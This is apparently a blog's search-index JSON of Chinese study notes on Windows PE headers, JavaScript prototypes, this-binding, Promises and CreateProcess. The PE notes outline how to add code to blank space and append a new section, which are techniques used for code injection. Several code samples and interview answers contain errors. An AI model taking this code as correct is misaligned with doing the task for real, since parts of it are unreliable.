WORD Characteristics;&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; _IMAGE_FILE_HEADERMachine: 该字段为WORD类型，占用2字节，该字段标识可执行文件的目标CPU类型NumberOfSections: 该字段为WORD类型，占用2字节，该字段标识PE文件的节区个数TimeDateStamp: 该字段表示编译器填写的时间戳与文件属性中（创建时间、修改时间无关），这个值是自1970年1月1日以来用格林威治时间计算的秒数PointerToSymbolTable: 该字段很少使用，调试相关NumberOfSymbols: 该字段很少使用，调试相关SizeOfOptionalHeader: 该字段为WORD类型，占用2字节；该字段指定IMAGE_OPTIONAL_HEADER结构大小(32位PE文件：0xEO 64位PE文件：0xF0)Characteristics: 该字段为WORD，占用2字节；该字段指定文件属性 Machine 字段取值范围 宏定义 值 意义 IMAGE_FILE_MACHINE_I386 0x014C Intel IMAGE_FILE_MACHINE_ALPHA 0x0184 DEC Alpha IMAGE_FILE_MACHINE_IA64 0x200 Intel(64-bit) IMAGE_FILE_MACHINE_AXP64 0x0284 DEC Alpha(64-bit) IMAGE_FILE_MACHINE_AMD64 0x8664 AMD64 (K8) Characteristics 字段取值范围 数据位 宏定义 值 为1时的含义 0 IMAGE_FILE_RELOCS_STRIPPED 0x0001 文件中不存在重定位信息 1 IMAGE_FILE_EXECUTABLE_IMAGE 0x0002 文件是可执行的 2 IMAGE_FILE_LINE_NUMS_STRIPPED 0x0004 不存在行信息 3 IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008 不存在符号信息 4 IMAGE_FILE_AGGRESIVE_WS_TRIM 0x0010 调整工作集 5 IMAGE_FILE_LARGE_ADDRESS_AWARE 0x0020 应用程序可处理大于2GB的地址 6 此标志位保留 7 IMAGE_FILE_BYTES_REVERSED_LO 0x0080 小尾方式 8 IMAGE_FILE_32BIT_MACHINE 0x0100 只在32平台运行 9 IMAGE_FILE_DEBUG_STRIPPED 0x0200 不包含调试信息 10 IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 0x0400 不能从可移动盘运行 11 IMAGE_FILE_NET_RUN_FROM_SWAP 0x0800 不能从网络运行 12 IMAGE_FILE_SYSTEM 0x1000 系统文件（驱动程序），不能直接运行 13 IMAGE_FILE_DLL 0x2000 DLL文件 14 IMAGE_FILE_UP_SYSTEM_ONLY 0x4000 文件不能在多处理器计算机上运行 15 IMAGE_FILE_BYTES_REVERSED_HI 0x8000 大尾方式 Characteristics 计算方式 C++1234例如：01020000 0001 0000 0010下标是1和8位为1；表示文件是一个可执行文件，只在32平台运行 可选头（扩展头）扩展头（32位） C++123456789101112131415161718192021222324252627282930313233typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; // 32位PE程序：10B 64位PE程序：20B 重要 BYTE MajorLinkerVersion; // 链接器版本号 BYTE MinorLinkerVersion; // 链接器版本号 DWORD SizeOfCode; // 所有代码节的总和，文件对齐后的大小，编译器填的 没用 DWORD SizeOfInitializedData; // 包含所有已经初始化数据的节的总大小，文件对齐后的大小，编译器填的 没用 DWORD SizeOfUninitializedData; // 包含未初始化数据的节的总大小，文件对齐后的大小，编译器填的 没用 DWORD AddressOfEntryPoint; // 程序入口 重要 DWORD BaseOfCode; // 代码开始的基址，编译器填的 没用 DWORD BaseOfData; // 数据开始的基址，编译器填的 没用 DWORD ImageBase; // 内存镜像基址 重要 DWORD SectionAlignment; // 内存对齐 重要 DWORD FileAlignment; // 文件对齐 重要 WORD MajorOperatingSystemVersion; // 标识操作系统版本号 主版本号 WORD MinorOperatingSystemVersion; // 标识操作系统版本号 次版本号 WORD MajorImageVersion; // PE文件自身的版本号 WORD MinorImageVersion; // PE文件自身的版本号 WORD MajorSubsystemVersion; // 运行所需子系统版本号 WORD MinorSubsystemVersion; // 运行所需子系统版本号 DWORD Win32VersionValue; // 子系统版本值，必须位0 DWORD SizeOfImage; // 内存中整个PE文件的映射的尺寸，可比实际的值大，必须是SectionAlignment整数倍 重要 DWORD SizeOfHeaders; // 所有头 + 节表按照文件对齐后的大小，否则加载会出错 重要 DWORD CheckSum; // 校验和，一些系统文件有要求用来判断文件是否被修改 重要 WORD Subsystem; // 子系统 驱动程序（1）图形界面（2）控制台、DLL（3） WORD DllCharacteristics; // 文件特性 不是针对DLL文件的 DWORD SizeOfStackReserve; // 初始化时保留的栈大小 DWORD SizeOfStackCommit; // 初始化实际提交的大小 DWORD SizeOfHeapReserve; // 初始化保留的堆大小 DWORD SizeOfHeapCommit; // 初始化实际提交的大小 DWORD LoaderFlags; // 调试相关 DWORD NumberOfRvaAndSizes; // 目录项目数 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 程序真正入口：ImageBase 内存镜像基址 + AddressOfEntryPoint 程序入口 _IMAGE_SECTION_HEADER(节表)123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union &#123; DWORD PhysicalAddress; DWORD VirtualSize; &#125; Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics;&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 空白区域添加代码构造跳转地址公式 要跳转的地址 - E8指令当前的地址 - 5 新增节新增节的步骤判断是否有足够的空间，可以添加一个节表在节表中新增一个成员修改PE头中节的数量修改SizeOfImage的大小在原有数据的最后，新增一个节的数据（内存对齐的整数倍）修正新增节表的属性","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"原型链的应用","slug":"原型链的应用","date":"2023-04-22T02:51:25.000Z","updated":"2023-04-22T16:42:19.311Z","comments":true,"path":"85f7c1f6.html","link":"","permalink":"http://example.com/85f7c1f6.html","excerpt":"面向对象编程思维提高代码的可复用率 &#x3D;&gt; 更加合理的数据关系隐式原型和显式原型对象的隐式原型和构造函数的显式原型的连接原型链机制核心 a. new: 执行前绑定this并指向空对象, 将对象的隐式原型指向函数的显式原型 b. [[GET]]","text":"面向对象编程思维提高代码的可复用率 &#x3D;&gt; 更加合理的数据关系隐式原型和显式原型对象的隐式原型和构造函数的显式原型的连接原型链机制核心 a. new: 执行前绑定this并指向空对象, 将对象的隐式原型指向函数的显式原型 b. [[GET]] Object和Function关键点Object.prototype.__proto__ &#x3D; null &#x3D;&gt; 原型链的终点; 不是所有对象都是Object的实例Function.prototype.__proto__ &#x3D; Object.prototype &#x3D;&gt; new Object()Object.__proto__ &#x3D; Function.prototype &#x3D;&gt; new Function()Function.__proto__ &#x3D; Function.prototype &#x3D;&gt; 指向自己, 执行前通过代码注入 instanceof方法instanceofa instanceof Func本质：递归作用：判断 a 是不是 Func 的一个实例 s1.__proto__ &#x3D; Student.prototype -&gt; falseStudent.prototype.__proto__ &#x3D; Object.prototype -&gt; true 1234567891011121314151617181920function Student(name, sex, age, major) &#123; this.name = name; this.sex = sex; this.age = age; this.major = major;&#125;var s1 = new Student(&#x27;jack&#x27;, 18, &#x27;male&#x27;, &#x27;cs&#x27;);var s2 = new Student(&#x27;lucy&#x27;, 20, &#x27;female&#x27;, &#x27;english&#x27;);// 自己封装instanceofObject.myInstanceOf = function(obj, Func) &#123; if(obj === null) return false; if(Object.getPrototypeOf(obj) === Fun.prototype) &#123; return true; &#125;else &#123; return myInstanceOf(Object.getPrototypeOf(obj, Func)); &#125;&#125;// Object.getPrototypeOf() -&gt; 返回对象的隐式原型 数组和类数组数组和类数组的区别本质上是原型链上的区别 1234567891011121314151617181920212223var a = [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;];// 数组a = &#123; &#x27;0&#x27;: 1, &#x27;1&#x27;: 2, &#x27;2&#x27;: 3, length: 3, __proto__: Array.prototype&#125;;// 类数组a = &#123; &#x27;0&#x27;: 1, &#x27;1&#x27;: 2, &#x27;2&#x27;: 3, length: 3, __proto__: xxx&#125;;function demo() &#123; console.log(arguments);&#125;demo(1, 2, 3); 隐式原型的修改隐式原型的修改Object.getPrototypeOf(obj) -&gt; 返回参数对象的隐式原型Object.setPrototypeOf(obj, obj) &#x2F;&#x2F; 不推荐Object.create() &#x2F;&#x2F; 返回一个以obj为隐式原型的值的对象如何得到一个没有任何属性的对象 var o &#x3D; Object.create(null); [[PUT]]&amp;&amp;[[GET]][[PUT]][[PUT]] -&gt; LHS 左查询判断对象中有没有属性如果有, 就找到并返回该地址如果没找到(1) 沿着原型链找A. 找到这个属性(a). 如果是基本类型 -&gt; 覆盖 -&gt; 在对象自身创建这个属性并返回(b). 引用类型：xxx. 对引用类型的引用 -&gt; 覆盖yyy. 对引用类型的访问 -&gt; 修改(2) 没有找到 -&gt; 直到原型链终点 -&gt; 给对象自身创建一个 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var bar = new Object();// 找到该属性并且是基本类型 // bar.prototype.b = 1;// bar.b = 2;// console.log(bar)/** 返回结果: b为基本类型, 会在自身创建属性并返回, 原型链上不变 * bar &#123; * b: 2, * [[prototype]]: Object &#123; * b: 1 * &#125; * &#125; */// 找到该属性并且是引用类型 -- 访问Object.prototype.demo = &#123; m: 1,&#125;// bar.demo.m = 2;// console.log(Object.prototype);/** 返回结果 对引用类型的访问会修改 * Object &#123; * demo: &#123; * m: 2, * &#125; * &#125; */// 找到该属性 -- 对引用类型的引用bar.demo = 2;console.log(bar);/** 返回结果 对引用类型的引用会覆盖 * bar &#123; * demo: 2, * [[prototype]]: Object &#123; * demo: &#123; m: 1 &#125;, * &#125; * &#125; */bar.a = 1 // 会在对象自身创建/** 返回 * bar &#123; * a: 1, * [[prototype]]: Object * &#125; */ 面试题面试题 - 01123456789101112131415161718function A() &#123;&#125;A.prototype.n = 3;A.prototype.add1 = function () &#123; this.n++; // this.n = this.n + 1 RHS [[GET]] // 左边this.n =&gt; LHS -&gt; [[PUT]] =&gt; 基本类型(自身创建覆盖) =&gt; A &#123; n: 4 &#125;&#125;var a = new A();var b = new A();var c = new A()a.add1();/** 分析 通过点(.)的方式调用函数会绑定this * (1). a.add1 -&gt; 属于RHS: 读操作，获取a.add1的返回值 * (2). RHS -&gt; [[GET]] -&gt; a.[[__proto__]] -&gt; A.prototype.[[__proto__]] */b.add1();console.log(a.n, b.n, c.n); // 4, 4, 3 面试题 - 021234567891011function A () &#123;&#125;;A.prototype.m = &#123; t: 1,&#125;;A.prototype.add2 = function() &#123; this.m = &#123;&#125;; // 写操作 =&gt; 对引用对象的引用 =&gt; 覆盖 =&gt; d &#123; m: &#123;&#125;, prototype: Object &#123; add2: f(), m: &#123;t: 1&#125;&#125;&#125; // LHS -&gt; [[PUT]]&#125;var d = new A();d.add2(); // RHS =&gt; [[GET]] -&gt; d.[[__proto__]] -&gt; A.prototypeconsole.log(d.m.t); // undefined 面试题 - 03123456789101112131415161718function Person(name, age) &#123; this.name = name; this.age = age; this.eat = function() &#123; console.log(age + &quot;岁的&quot; + name + &quot;在吃饭.&quot;); &#125;;&#125;Person.run = function() &#123;&#125;;Person.prototype.walk = function () &#123;&#125;;let p1 = new Person(&#x27;jsliang&#x27;, 24);let p2 = new Person(&#x27;jsliang&#x27;, 24);// 对象的引用的值判断 -&gt; 判断地址console.log(p1.eat === p2.eat); // false =&gt; new的时候指向不同的地址console.log(p1.run === p2.run); // trueconsole.log(p1.walk === p2.walk); // true 面试题 - 04123456789101112function foo() &#123; this.some = &#x27;222&#x27;; // 能访问到 let ccc = &#x27;ccc&#x27;; foo.obkorou1= &#x27;obkorou1&#x27;; foo.prototype.a = &#x27;aaa&#x27;; // 能访问到&#125;foo.koro = &#x27;扣肉&#x27;;foo.prototype.test = &#x27;test&#x27; // 被修改let foo1 = new foo();foo.prototype.test = &#x27;test2&#x27;; // 能访问到// foo1 访问到哪些属性?","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"原型链","slug":"原型链","date":"2023-04-16T13:12:07.000Z","updated":"2023-04-22T09:17:05.792Z","comments":true,"path":"bf8cf30.html","link":"","permalink":"http://example.com/bf8cf30.html","excerpt":"理解原型链理解new关键字的作用机制（写）理解[[GET]]（读）","text":"理解原型链理解new关键字的作用机制（写）理解[[GET]]（读） new的执行流程123456function foo() &#123; console.log(1);&#125;const a = new foo(); // 第二步用代码表示：this.__proto__ = foo.prototype； 返回值：this指向的对象的引用console.log(a); new的执行流程绑定this为空对象让空对象[[Prototype]](__protot__) –&gt; 函数的prototype属性 (1) 所有对象都有[[Prototype]](隐式属性 __protot__) -&gt; 所有对象本质上都是new出来的 (2) 所有的函数对象 -&gt; prototype正常执行函数如果函数返回的基本类型，返回this的值，否则返回原函数的返回值 new执行流程图解 [[GET]]1234567function foo() &#123; console.log(1);&#125;const a = new foo(); a.b // 不报错返回undefinedconsole.log(a.b) // 访问对象属性的本质，底层帮调用 [[GET]]流程判断对象里面有没有判断它的__proto__指向的对象里面有没有 面试题123456789101112131415Object.prototype.a = function () &#123; console.log(&#x27;a&#x27;);&#125;;Function.prototype.b = function () &#123; console.log(&#x27;b&#x27;);&#125;;var F = new function() &#123; &#125;;var f = new F();console.log(f.a) // 打印aconsole.log(f.a) // 打印undefinedconsole.log(F.a) // 打印aconsole.log(F.b) // 打印b 原型链面试题图解 原型链的终点是：Object.prototype.[[prototype]] &#x3D; nullObject.prototype.__proto__ &#x3D; null; &#x2F;&#x2F; 不是所有对象都是Object的实例Function.prototype.__proto__ &#x3D; Object.prototype; &#x2F;&#x2F; new Object()Object.__proto__ &#x3D; Function.prototype; &#x2F;&#x2F; new Funtion()Function.__proto__ &#x3D; Function.prototype","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"变量","slug":"变量","date":"2023-04-16T02:18:20.000Z","updated":"2023-04-16T12:53:28.963Z","comments":true,"path":"13ffbe88.html","link":"","permalink":"http://example.com/13ffbe88.html","excerpt":"变量的本质深拷贝垃圾回收","text":"变量的本质深拷贝垃圾回收 变量的本质栈(stack)的特性结构性强，内存连续寻址速度快数据稳定容量小 原始类型原始类型存于栈中原始类型不可修改; 无法直接修改指向内存中的值, 需要新开辟一块内存类型typeof返回值对象包装器Null“object”N&#x2F;AUndefined“undefined”N&#x2F;ABoolean“boolean”BooleanNumber“number”NumberBigInt“bigint”BigIntString“string”StringSymbol“symbol”Symbol 堆(heap)的特性类似于书架存储以坨为单位容量大不同数据间内存不连续 引用类型在js中引用类型指的是对象（Object）; 示例代码-011234567891011121314var b1 = 1, b2 = b1; // RHS right head-side search 右查询（本质：读了内存中存的值）b2 = b1; // 本质是在内存中指向了新的数据（2），旧数据（1）将被回收console.log(b1, b2);var r1 = &#123; a: 1, &#125;, r2 = r1; // 程序本身只允许访问栈，无法访问堆；栈和堆通过标识符建立连接r2.a = 2; // 因为r1和r2同时指向了堆中的数据，所以修改r2，r1随之改变console.log(r1.a, r2.a) 字符串(特殊)字符串本质上是存放在堆中，但是它是一个原始类型，原始类型不能直接修改栈中的数据，而是新建了一个标识符并指向了堆中的新数据 示例代码-021234var a = &#x27;hello word&#x27;, b = a;b = &#x27;hello&#x27;; // 栈中会新建标识符指向新数据，旧数据则被回收consoel.log(a, b); 变量总结知识总结数据组织的方式不同 – 栈中的内存是连续的，堆中不是用户权限不同 – 用户能读取栈中的数据不能读取堆中的数据大小不同 – 栈的空间小堆的空间大寻址速度不同 – 栈的寻址速度快而堆的寻址速度慢作用不同 – 栈中存的是基本类型、引用类型的标识符以及字符串的标识符；堆中存放大小不确定的数据 值传递和引用传递所谓的引用传递取决于传递的是值还是地址；在javascript中本质上就是值传递（读栈stack内存中的值） 示例代码-01123456789101112131415function change1(arg) &#123; arg = 200;&#125;function change2(arg)&#123; arg.a = 200;&#125;var foo = 100;var bar = &#123; a: 100 &#125;;change1(foo);change2(bar);console.log(foo, bar); 深拷贝&amp;浅拷贝代码示例1234567891011121314151617181920212223242526272829303132333435363738394041var person1 = &#123; age: 28, hobby: &#x27;学习&#x27;, son: &#123; age: 3, hobby: &#x27;drink milk&#x27;, friends: [&#x27;jack&#x27;, &#x27;lucy&#x27;], &#125;,&#125;// 浅拷贝function clone2(obj) &#123; var clonePerson = &#123;&#125;; for(var key in obj) &#123; clonePerson[key] = obj[key]; &#125; return clonePerson;&#125;var newPerson = clonePerson(person1);newPerson.age = 18;console.log(person1.age);newPerson.son.age = 100; // 会改变，son是一个object属于引用类型存放于堆中，newPerson.son和person1.son指向同一个console.log(newPerson.son.age);// 利用递归实现深拷贝function clone2(obj) &#123; if(typeof obj !== &#x27;object&#x27; || obj === null) &#123; return obj; &#125; var clone = Array.isArray(obj) ? [] : &#123;&#125;; for(var key in obj) &#123; if(typeof obj[key] === &#x27;object&#x27;) &#123; clone2(obj[key]) &#125;else &#123; clone[key] = obj[key]; &#125; &#125; return clone;&#125; 垃圾回收stack存储基本变量和引用类型的指向;heap存储复杂数据和字符串;stack会自动回收,heap借助垃圾回收机制进行回收，但需要一定的手动操作; 视频地址变量的本质&深拷贝&垃圾回收https://www.bilibili.com/video/BV1Ed4y1x7oN/?p=6&spm_id_from=pageDriver&vd_source=cb73e5c2249f330a061d8900da3573a8","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"Promise异步任务并发","slug":"Promise异步任务并发","date":"2023-04-05T05:23:21.000Z","updated":"2023-04-16T12:54:15.168Z","comments":true,"path":"5d76cec.html","link":"","permalink":"http://example.com/5d76cec.html","excerpt":"背景设计一个方法doSomething来限制异步任务的最大并发数","text":"背景设计一个方法doSomething来限制异步任务的最大并发数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576function sleep (timeout: number, taskName: string) &#123; return new Promise&lt;void&gt;(resolve =&gt; &#123; console.log(`$&#123;taskName&#125;开始啦`); setTimeout(() =&gt; &#123; console.log(`$&#123;taskName&#125;结束啦`); resolve(); &#125;, timeout) &#125;);&#125;const tasks = [ () =&gt; sleep(1000, &#x27;睡觉&#x27;), () =&gt; sleep(2000, &#x27;吃饭&#x27;), () =&gt; sleep(3000, &#x27;打游戏&#x27;), () =&gt; sleep(5000, &#x27;写代码&#x27;), () =&gt; sleep(7000, &#x27;做运动&#x27;),];async function doSomething(tasks:(()=&gt;Promise&lt;void&gt;)[], limit=2) &#123; // 正在执行中的任务的集合 const taskPool = new Set(); for (const task of tasks) &#123; const promise = task(); taskPool.add(promise); promise.then(() =&gt; taskPool.delete(promise)); if (taskPool.size &gt;= limit) &#123; await Promise.race(taskPool); &#125; &#125; return Promise.all(taskPool);&#125;/** 如果存在同步任务情况async function doSomething(tasks:(()=&gt;Promise&lt;void&gt;)[], limit=2) &#123; // 正在执行中的任务的集合 const taskPool = new Set(); for (const task of tasks) &#123; const promise = task(); const p = Promise.resolve(promise) // 包装Promise, 同步任务直接返回 taskPool.add(p); promise.then(() =&gt; taskPool.delete(p)); if (taskPool.size &gt;= limit) &#123; await Promise.race(taskPool); &#125; &#125; return Promise.all(taskPool);&#125; */doSomethin(tasks).then(() =&gt; &#123; console.log(&#x27;任务全部执行完了&#x27;);&#125;)// 加载图片function getTasks(urls) &#123; const tasks = []; urls.forEach(url =&gt; &#123; tasks.push(() =&gt; &#123; new Promise(resolve =&gt; &#123; const img = new Image(); img.onload = () =&gt; &#123; resolve(); &#125; img.src = url; &#125;) &#125;) &#125;) return tasks;&#125;doSomething(getTasks([&#x27;xxxx.jpg&#x27;, &#x27;xxxx.png&#x27;])).then(() =&gt; &#123; console.log(&#x27;全部执行完了&#x27;);&#125;)// 加载图片 视频地址【Promise的异步任务并发限制还不会写？还只会Promise.all ？今天一次性教会你实现思路与细节！】ttps://www.bilibili.com/video/BV1i24y1L72L/?share_source=copy_web&vd_source=a11f39cbd36d0048998b780fa95bc7df","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"async/await 学习","slug":"async-await","date":"2023-04-04T14:40:36.000Z","updated":"2023-04-04T15:26:12.522Z","comments":true,"path":"ca9ee217.html","link":"","permalink":"http://example.com/ca9ee217.html","excerpt":"async 函数可能包含 0 个或者多个 await 表达式。await 表达式会暂停整个 async 函数的执行进程并出让其控制权，只有当其等待的基于 promise 的异步操作被兑现或被拒绝之后才会恢复进程。promise 的解决值会被当作该 await 表达式的返回值。使用 async&#x2F;await 关键字就可以在异步代码中使用普通的 try&#x2F;catch 代码块。","text":"async 函数可能包含 0 个或者多个 await 表达式。await 表达式会暂停整个 async 函数的执行进程并出让其控制权，只有当其等待的基于 promise 的异步操作被兑现或被拒绝之后才会恢复进程。promise 的解决值会被当作该 await 表达式的返回值。使用 async&#x2F;await 关键字就可以在异步代码中使用普通的 try&#x2F;catch 代码块。 备注await关键字只在 async 函数内有效。如果你在 async 函数体之外使用它，就会抛出语法错误 SyntaxError。 备注async&#x2F;await的目的为了简化使用基于 promise 的 API 时所需的语法。async&#x2F;await 的行为就好像搭配使用了生成器和 promise。 示例12345678910111213141516171819202122232425262728293031323334353637let count = 0;function request (url) &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; resolve(url + count ++); &#125;, 500); &#125;);&#125;// 使用async/await语法糖// async function run () &#123;// const res1 = await request(&#x27;1111&#x27;);// const res2 = await request(res1);// console.log(res2);// &#125;// run();// 基于生成器函数模拟async/awaitfunction* generate() &#123; const res = yield request(&#x27;1111&#x27;); const res2 = yield request(res); console.log(res2);&#125;// 使用递归实现连续调用function run () &#123; const g = generate(); function exec (params) &#123; const &#123; value, done &#125; = g.next(); if (!done) &#123; value.then(res =&gt; exec(res)); &#125; &#125; exec();&#125;run();","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"this 指向","slug":"this指向学习","date":"2023-04-01T12:15:04.000Z","updated":"2023-04-03T16:09:03.414Z","comments":true,"path":"6cfe1ad3.html","link":"","permalink":"http://example.com/6cfe1ad3.html","excerpt":"this到底指向什么？ 函数在调用时，JavaScript会默认给this绑定一个值this的绑定和定义的位置（编写的位置）没有关系this的绑定和调用方式以及调用的位置有关系this是在运行时被绑定的","text":"this到底指向什么？ 函数在调用时，JavaScript会默认给this绑定一个值this的绑定和定义的位置（编写的位置）没有关系this的绑定和调用方式以及调用的位置有关系this是在运行时被绑定的 this 绑定规则this的绑定规则绑定一：默认绑定绑定二：隐式绑定绑定三：显示绑定绑定四：new绑定 默认绑定独立的函数调用可以理解成函数没有被绑定到某个对象上进行调用 严格模式，独立调用的函数中的this指向的是undefined 12345678910111213141516171819202122// 1. 普通函数被独立调用function foo () &#123; console.log(&#x27;foo &#x27;, this);&#125;;foo(); // 指向window// 2. 函数定义在对象中，但是独立调用const obj = &#123; name: &#x27;why&#x27;, bar: function () &#123; console.log(&#x27;bar &#x27;, this); &#125;,&#125;;// obj.bar(); // 指向obj对象const baz = obj.bar;baz() // 指向window// 3. 严格模式，独立调用的函数中的this指向的是undefined 案例案例一12345function () &#123; console.log(this);&#125;foo() 案例二123456789101112131415function test1 () &#123; console.log(this); test2();&#125;function test2 () &#123; console.log(this); test3();&#125;function test3 () &#123; console.log(this);&#125;test1(); 案例三12345678910111213// 高阶函数function foo (func) &#123; func()&#125;const obj = &#123; name: &#x27;why&#x27;, bar: function () &#123; console.log(this); &#125;&#125;foo(obj.bar); // 属于独立调用 隐式绑定通过某个对象进行调用；也就是它的调用位置中，是通过某个对象发起的函数调用 隐式绑定的前提条件必须在调用的对象内部有一个对函数的引用（比如一个属性）；如果没有这样的引用，在进行调用时，会报找不到该函数的错误；正是通过这样的引用，间接的将this绑定到这个对象上； 1234567891011// 隐式绑定function foo () &#123; console.log(this);&#125;const obj = &#123; bar: foo,&#125;obj.bar(); // 指向obj对象 案例案例一123456789101112131415function foo () &#123; console.log(this);&#125; const obj = &#123; name: &#x27;obj&#x27;, foo: foo, &#125; const obj2 = &#123; name: &#x27;obj2&#x27;, obj1: obj2, &#125; obj2.obj1.foo(); // 指向obj1对象 案例21234567891011function foo () &#123; console.log(this);&#125;const obj1 = &#123; name: &#x27;obj1&#x27;, foo: foo,&#125;const bar = obj1.foo;bar(); // 指向obj1对象 显式绑定不希望在对象内部包含这个函数的引用，同时又希望在这个对象上进行强制调用；可以使用显式绑定 call和apply方法第一个参数是相同的，要求传入一个对象这个对象的作用就是给this准备的在调用这个函数时，会将this绑定到这个传入的对象上后面的参数；apply为数组，call为参数列表 1234567891011121314151617function foo (name, age, height) &#123; console.log(&#x27;foo 函数被调用 &#x27;, this); console.log(&#x27;打印参数 &#x27;, name, age, height);&#125;// ()调用// foo(&#x27;why&#x27;, 18, 180);// apply// 第一个参数：绑定this// 第二个参数：传入额外的实参，以数组的形式// foo.apply(&#x27;apply&#x27;, [&#x27;kobe&#x27;, 30, 198])// call// 第一个参数：绑定this// 第二个参数：后续的参数以多参数的形式传递，会作为实参foo.call(&#x27;call&#x27;, &#x27;james&#x27;, 35, 205); bind 的显示绑定如果我们希望一个函数总是显式的绑定到一个对象上，可以使用 bind 方法；bind()方法创建一个新的绑定函数(bound function, BF)绑定函数是一个exotic function object(怪异函数对象，ECMAScript 2015 中的术语)在bind() 被调用时，这个新函数的this被指定为bind() 的第一个参数，而其余参数将作为新函数的参数，供调用时使用 1234567891011121314function foo (name, age, height) &#123; console.log(&#x27;foo &#x27;, this);&#125;const obj = &#123; &#x27;name&#x27;: &#x27;why&#x27; &#125;;// 需求：调用foo时，总是绑定到obj对象身上（不希望obj对象上有函数）// 1. bind函数的基本使用const bar = foo.bind(obj);bar(); // this --&gt; obj// 2. bind函数的其他参数const test = foo.bind(obj, &#x27;kobe&#x27;, 30, 198)test() new绑定JavaScript中的函数可以当做一个类的构造函数来使用，也就是使用new关键字 使用new关键字调用函数执行的操作创建新的空对象；新对象会被执行prototype连接；新对象会绑定到函数调用的this上（this绑定在这个步骤完成）；没有显示返回非空对象时，默认返回这个对象； 123456789101112131415function foo () &#123; this.name = &#x27;why&#x27;; console.log(this);&#125;new foo(); // 指向foo对象// 创建Personfunction Person (name) &#123; console.log(this); // Person &#123;&#125; this.name = name; // Person &#123; name: &#x27;why&#x27; &#125;&#125;const p = new Person(&#x27;why&#x27;);console.log(p); 内置函数的调用绑定","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"OpenProcess","slug":"OpenProcess","date":"2023-04-01T11:41:00.000Z","updated":"2024-07-30T01:37:41.183Z","comments":true,"path":"59bbde9c.html","link":"","permalink":"http://example.com/59bbde9c.html","excerpt":"openProcess","text":"openProcess openProcess 释义","categories":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"}],"tags":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"}]},{"title":"CreateProcess","slug":"CreateProcess","date":"2023-04-01T11:06:25.000Z","updated":"2024-08-04T09:15:47.780Z","comments":true,"path":"e0165a92.html","link":"","permalink":"http://example.com/e0165a92.html","excerpt":"CreateProcess创建一个新进程及主线程。新进程在调用进程的安全上下文中运行;","text":"CreateProcess创建一个新进程及主线程。新进程在调用进程的安全上下文中运行; 函数声明12345678910111213141516171819202122232425262728293031323334353637WINBASEAPIBOOLWINAPICreateProcessA( _In_opt_ LPCSTR lpApplicationName, _Inout_opt_ LPSTR lpCommandLine, _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment, _In_opt_ LPCSTR lpCurrentDirectory, _In_ LPSTARTUPINFOA lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation );WINBASEAPIBOOLWINAPICreateProcessW( _In_opt_ LPCWSTR lpApplicationName, _Inout_opt_ LPWSTR lpCommandLine, _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment, _In_opt_ LPCWSTR lpCurrentDirectory, _In_ LPSTARTUPINFOW lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation );#ifdef UNICODE#define CreateProcess CreateProcessW#else#define CreateProcess CreateProcessA#endif // !UNICODE 参数lpApplicationName要执行的模块的名称。lpApplicationName参数可以是NULL, 要运行批处理文件, 必须启动命令解释程序, 并将lpApplicationName设置成cmd.exe; lpCommandLine要执行的命令行。lpCommandLine的参数可以是NULL, 在这种情况下, 该函数使用由lpApplicationName指向的字符串作为命令行。如果lpApplicationName和lpCommandLine都不为NULL, 则由lpApplicationName指向的以空字符串结尾的字符串会指定要执行的模块, 并且由lpCommandLine指向的以空字符串结尾的字符串会指定命令行; lpProcessAttributes指向SECURITY_ATTRIBUTES结构的指针, 